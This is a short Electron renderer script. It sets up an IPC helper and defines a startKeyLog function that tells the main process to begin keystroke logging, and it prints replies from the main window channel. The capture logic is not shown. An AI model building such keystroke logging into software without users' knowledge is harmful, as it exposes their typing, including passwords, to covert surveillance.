const { ipcRenderer } = require('electron');

window.$ = window.jQuery = require("jquery");

async function sendIPCMessage(channel, ...args) {
    return await ipcRenderer.invoke(channel, args[0]);
}

function startKeyLog() {
    sendIPCMessage("mainWindow", {method: "keylog", options: {value: "start"}});
    return;
}

ipcRenderer.on("mainWindowMsg", (e, data) => {
    console.log(data);
});